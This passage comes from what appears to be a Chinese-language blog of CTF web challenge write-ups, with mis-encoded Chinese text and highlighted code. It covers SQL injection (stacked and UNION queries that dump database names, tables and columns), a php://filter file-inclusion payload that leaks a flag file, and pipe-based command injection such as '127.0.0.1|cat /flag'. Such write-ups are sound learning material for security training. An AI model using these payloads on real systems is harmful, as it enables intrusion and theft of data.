å‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°,å¹¶è¿”å›å­—ç¬¦ä¸²çš„å‰©ä½™éƒ¨åˆ†ã€‚</span>\n<span class=\"token comment\">//ä¸€ä¸‹ifè¯­å¥è¿‡æ»¤äº†\"php://input\" ã€ \"zip://\" ã€ \"phar://\" ã€ \"data:\"</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"zip://\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"phar://\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"data:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;a href=\"?file=flag.php\"&gt;tips&lt;/a&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n</code></pre>\n<h1><a id=\"SUCTF_2019EasySQL_193\"></a>[SUCTF 2019]EasySQL</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\183c8ab029cf41f3aacb0e81e0dde37b.png\"/><br/> å…ˆåˆ¤æ–­ä¸€ä¸‹æ˜¯æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹ï¼Œè¾“å…¥1<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\e9b6f1d8999e4c0e9848f624c6fd1df3.png\"/><br/> OKï¼Œæœ‰å›æ˜¾ï¼›ç„¶åå„ç§è¯•è¯•è¯•ï¼Œéƒ½æ˜¯nonono</p>\n<p>è¿˜å¥½ï¼Œè¯•äº†ä¸€ä¸‹å †å æ³¨å…¥<br/> çˆ†å‡ºæ•°æ®åº“ï¼š<code>1;show databases;#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\354e161c61af4ad1aff231a70ab2818a.png\"/>çˆ†è¡¨ï¼š<code>1;show tables;#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ef1f079e0bd54fd8a11e77ddcd80206e.png\"/>ç„¶åçˆ†å­—æ®µï¼š<code>1;show columns from FLAG;#</code>ï¼Œè¾“å…¥åå›æ˜¾<code>Nonono.</code>,çŒœæµ‹æœ‰è¢«è¿‡æ»¤<br/> æ€»ä¹‹è¯•äº†å¥½å¤šï¼Œæå¾—æˆ‘åˆåŒå’å•ä¸ä¼šäº†ï¼Œå”‰Â·Â·Â·</p>\n<p>ä¸‹é¢æ˜¯å­¦ä¹ ä¼—å¤šå¤§ä½¬çš„æ–¹æ³•<br/> ä¸çŸ¥é“å¤§ä½¬ä»¬æ€ä¹ˆçŒœæµ‹å‡ºæŸ¥è¯¢è¯­å¥ä¸ºï¼š<code>select \".$post['query'].\"||flag from Flag</code><br/> ç”±äºæœ¬é¢˜æ²¡æœ‰è¿‡æ»¤<code>*</code>ï¼Œç”¨<code>*</code>æŸ¥è¯¢flagä¸­çš„æ‰€æœ‰å­—æ®µï¼Œæ‰€ä»¥ç›´æ¥æ„é€ payloadä¸ºï¼š<code>*,1</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\3ccde604e3c741a7b24d62655e62e164.png\"/><br/> å°±æ˜¯è¿™ä¹ˆç¥å¥‡</p>\n<h1><a id=\"_2019Secret_File_212\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\515a739542784953b80df68919a4cbb4.png\"/><br/> æŸ¥çœ‹æºç </p>\n<pre><code class=\"prism language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">&gt;</span></span><span class=\"token style\"><span class=\"token language-css\">\n<span class=\"token selector\">#master</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span>absolute<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">left</span><span class=\"token punctuation\">:</span>44%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">bottom</span><span class=\"token punctuation\">:</span>0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">text-align</span> <span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token selector\">p,h1</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token property\">cursor</span><span class=\"token punctuation\">:</span> default<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">&gt;</span></span>\n\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>è’‹ç’æºçš„ç§˜å¯†<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>black<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span>\n\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>verdana<span class=\"token punctuation\">;</span><span class=\"token property\">color</span><span class=\"token punctuation\">:</span>red<span class=\"token punctuation\">;</span><span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span>ä½ æƒ³çŸ¥é“è’‹ç’æºçš„ç§˜å¯†ä¹ˆï¼Ÿ<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span>\n\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>arial<span class=\"token punctuation\">;</span><span class=\"token property\">color</span><span class=\"token punctuation\">:</span>red<span class=\"token punctuation\">;</span><span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span>20px<span class=\"token punctuation\">;</span><span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span>æƒ³è¦çš„è¯å¯ä»¥ç»™ä½ ï¼Œå»æ‰¾å§ï¼æŠŠä¸€åˆ‡éƒ½æ”¾åœ¨é‚£é‡Œäº†ï¼<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>master<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>./Archive_room.php<span class=\"token punctuation\">\"</span></span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>#000000<span class=\"token punctuation\">;</span><span class=\"token property\">height</span><span class=\"token punctuation\">:</span>70px<span class=\"token punctuation\">;</span><span class=\"token property\">width</span><span class=\"token punctuation\">:</span>200px<span class=\"token punctuation\">;</span><span class=\"token property\">color</span><span class=\"token punctuation\">:</span>black<span class=\"token punctuation\">;</span><span class=\"token property\">left</span><span class=\"token punctuation\">:</span>44%<span class=\"token punctuation\">;</span><span class=\"token property\">cursor</span><span class=\"token punctuation\">:</span>default<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span>Oh! You found me<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span><span class=\"token property\">bottom</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span><span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 99%<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>center<span class=\"token punctuation\">\"</span></span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">font</span><span class=\"token punctuation\">:</span>italic 15px Georgia<span class=\"token punctuation\">,</span>serif<span class=\"token punctuation\">;</span><span class=\"token property\">color</span><span class=\"token punctuation\">:</span>white<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span> Syclover @ cl4y<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n\n</code></pre>\n<p>æœ‰è¿™æ ·ä¸€è¡Œä»£ç <code>&lt;a id=\"master\" href=\"./Archive_room.php\" style=\"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;\"&gt;Oh! You found me&lt;/a&gt;</code><br/> è¿›å…¥è¿™ä¸ªç›®å½•æŸ¥çœ‹ä¸€ä¸‹<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\e0dabffb82ea446bb66a2c254f6f354f.png\"/><br/> ç‚¹å‡»secret<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\1f20bf39aec24c2ebdaff334c72bbbb9.png\"/><br/> æç¤ºæŸ¥é˜…ç»“æŸï¼Œè¿”å›ä¸Šä¸ªç›®å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\53266388d5874a4fb6db27f5baf263ca.png\"/>æ­¤æ—¶ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼ŒæŠ“ä¸ªåŒ…è¯•äº†è¯•</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\42d71c810a9a407988be7318635b659e.png\"/><br/> è¿™é‡Œæç¤ºsecr3t.phpï¼Œæˆ‘ä»¬è¿›å…¥è¿™ä¸ªç›®å½•çœ‹ä¸€ä¸‹<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\0557a8c6e86b4aa982767da6b7af4646.png\"/><br/> è¿™é‡Œæç¤ºflagæ”¾åœ¨äº†flag.phpé‡Œï¼Œè¿›å…¥falg.phpç›®å½•<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\eb8413851fa54baaa23eaef303094939.png\"/>è¿˜æ˜¯æ²¡æœ‰å‡ºç°flagï¼Œæ‰¾åˆ°äº†ä½†æ˜¯çœ‹ä¸åˆ°ï¼Œæ­¤æ—¶åˆæƒ³åˆ°äº†PHPçš„å°è£…åè®®ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸‹ [ACTF2020 æ–°ç”Ÿèµ›]Includeé‡Œé¢ä½¿ç”¨çš„æ–¹æ³•</p>\n<p>æ„é€ payload: <code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code></p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> html<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span>html<span class=\"token operator\">&gt;</span>\n\n    <span class=\"token operator\">&lt;</span>head<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">&gt;</span><span class=\"token constant\">FLAG</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">&gt;</span>\n\n    <span class=\"token operator\">&lt;</span>body style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"background-color:black;\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span>\n        \n        <span class=\"token operator\">&lt;</span>h1 style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"font-family:verdana;color:red;text-align:center;\"</span><span class=\"token operator\">&gt;</span>å•Šå“ˆï¼ä½ æ‰¾åˆ°æˆ‘äº†ï¼å¯æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘<span class=\"token constant\">QAQ</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span>\n        \n        <span class=\"token operator\">&lt;</span>p style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"font-family:arial;color:red;font-size:20px;text-align:center;\"</span><span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"æˆ‘å°±åœ¨è¿™é‡Œ\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag{24db537d-9661-4a16-98c8-5c9df4c936fc}'</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$secret</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span>\n            <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>p<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">&gt;</span>\n\n</code></pre>\n<p>æˆåŠŸæ‰¾åˆ°flag~~</p>\n<h1><a id=\"ACTF2020_Exec_292\"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h1>\n<p>ä¸<a href=\"https://blog.csdn.net/m0_52923241/article/details/119087138\">[GXYCTF2019]Ping Ping Ping</a>é¢˜ç±»ä¼¼ï¼Œä½†æ­¤é¢˜æ›´ç®€å•</p>\n<blockquote>\n<p>éœ€è¦äº†è§£çš„çŸ¥è¯†ç‚¹<br/> lsï¼ˆè‹±æ–‡å…¨æ‹¼ï¼šlist filesï¼‰ï¼šç”¨äºæ˜¾ç¤ºæŒ‡å®šå·¥ä½œç›®å½•ä¸‹çš„å†…å®¹ï¼ˆåˆ—å‡ºç›®å‰å·¥ä½œç›®å½•æ‰€å«ä¹‹æ–‡ä»¶åŠå­ç›®å½•)</p>\n<p>catï¼ˆè‹±æ–‡å…¨æ‹¼ï¼šconcatenateï¼‰ï¼šç”¨äºè¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šã€‚</p>\n</blockquote>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\27d4e99021d040ab9a435c6ac17d6162.png\"/><br/> æŸ¥çœ‹æ­¤æ–‡ä»¶çš„ç›®å½•ï¼š<code>127.0.0.1|ls</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\d5f79731032a40df9ea51344df4a5635.png\"/><br/> åªæœ‰ä¸€ä¸ªindex.php</p>\n<p>æŸ¥çœ‹ä¸Šçº§ç›®å½•<code>127.0.0.1|ls /</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\c29a5732980f4405ac3ba839065bc9e1.png\"/><br/> æŸ¥çœ‹flagï¼š<code>127.0.0.1|cat /flag</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\64f19fa5a9334b2e982a78c6ee8879d2.png\"/><br/> æ‹¿åˆ°flag~~</p>\n<h1><a id=\"_2019LoveSQL_312\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\242884593c464b1ba91e95ea9db8bae3.png\"/>è¿™é‡Œæç¤ºç”¨ sqlmap æ˜¯æ²¡æœ‰çµé­‚çš„ï¼Œä»–è¯´æ²¡çµé­‚ï¼Œå¯æˆ‘å°±æ˜¯æƒ³è¯•ä¸€ä¸‹ï¼Œç»“æœç¡®å®æ²¡æœ‰çµé­‚ï¼Œå¥‰åŠåƒæˆ‘ä¸€æ ·æœ‰å›é€†å¿ƒç†çš„å¸ˆå‚…ä»¬è¿˜æ˜¯ä¸è¦æµªè´¹æ—¶é—´è¯•äº†Â·Â·Â·Â·Â·Â·</p>\n<p>å¬è¯å­©å­çš„è§£æ³•ï¼š<br/> å…ˆéšä¾¿è¾“å…¥ä¸€ä¸ªä¸‡èƒ½å¯†ç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ec90bdc21bc646b9a21e09ec9ebf4c01.png\"/><br/> æ‰¾åˆ°å›æ˜¾ä½ç½®<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\dcd76c57b66f46efb421bac58a0189ef.png\"/><br/> è¯•è¯•è”åˆæŸ¥è¯¢ï¼Œä¸€ç›´åˆ°3çš„æ—¶å€™å›æ˜¾æ­£å¸¸<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\3960f3f1cad6410c812e0e4078b1486b.png\"/><br/> 2å’Œ3æœ‰å›æ˜¾ä½ç½®<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\1a1dbddd5d7144b58062d23e75f884f9.png\"/><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\b92314f40f9b492abd8cb06dd99dc33c.png\"/></p>\n<p>è¾“å…¥ç”¨æˆ·åä¸º1<br/> çˆ†æ•°æ®åº“password=:<code>1' union select 1,2,database()#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\4203babe568f4debb5216d033444195c.png\"/><br/> å¾—åˆ°æ•°æ®åº“åä¸ºgeek<br/> çˆ†è¡¨åpassword=<code>1' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1#</code>â€”â€”çˆ†å‡ºè¡¨åä¸ºgeekuser<br/> çˆ†è¡¨åpassword=<code>1' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1#</code>â€”â€”çˆ†å‡ºè¡¨åä¸ºl0ve1ysq1<br/> çˆ†åˆ—åpassword=<code>1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' #</code>â€”â€”id,username,password<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\044f53d19a584c11834c2a7155b21f78.png\"/><br/> çˆ†æ•°æ®ï¼š<code>/check.php?username=1&amp;password=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\87359496026843baa2696b835d38c3d5.png\"/>å’¦ï¼Ÿæœ€åè¿™é‡Œæœ‰ç‚¹åƒflagçš„ä¸€éƒ¨åˆ†ï¼Œæ€ä¹ˆå°±å‡ºæ¥è¿™ç‚¹ï¼Ÿç¼©å°ä¸€ä¸‹çœ‹çœ‹</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\1f82f0f1b9b34c4ca642635090c97a8a.png\"/>å‘ï¼Œä¸èƒ½å†å°äº†ï¼›å˜»å˜»ï¼Œç›´æ¥F12å‘—</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\7f83bb460a144484a92ad61429439a0f.png\"/>æ‹¿åˆ°flag~~</p>\n<h1><a id=\"GXYCTF2019Ping_Ping_Ping_341\"></a>[GXYCTF2019]Ping Ping Ping</h1>\n<p><a href=\"https://blog.csdn.net/m0_52923241/article/details/119087138\">å…·ä½“çŸ¥è¯†ç‚¹ç‚¹è¿™é‡Œ</a><br/> <strong>é¢˜ç›®ç±»å‹ï¼šå‘½ä»¤æ‰§è¡Œ+ä»£ç å®¡è®¡</strong><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\078af8117b964ddcac036a549494c72f.png\"/><br/> æç¤º<code>/?ip=</code></p>\n<p>è¾“å…¥<code>/?ip=127.0.0.1</code>ï¼Œå›æ˜¾æˆåŠŸ<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\73005f65cd75471ba66c6430399d1108.png\"/><br/> æ˜¾ç¤ºå½“å‰çš„æ‰€æœ‰æ–‡ä»¶ï¼š<code>/?ip=127.0.0.1|ls</code></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\a1fe3b305c9d4ef8b6e6b45c95b6a84b.png\"/>è¿™é‡ŒæŸ¥åˆ°äº†ä¸¤ä¸ªphpæ–‡ä»¶<br/> æŸ¥çœ‹flag.phpï¼š<code>?ip=127.0.0.1|cat flag.php</code></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\474498c2c79a4f6599e6fb7c1b632742.png\"/>è¿™é‡Œæç¤º<code>/?ip= fxck your space!</code>é¢Â·Â·Â·fxckæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œspaceæ˜¯ç©ºæ 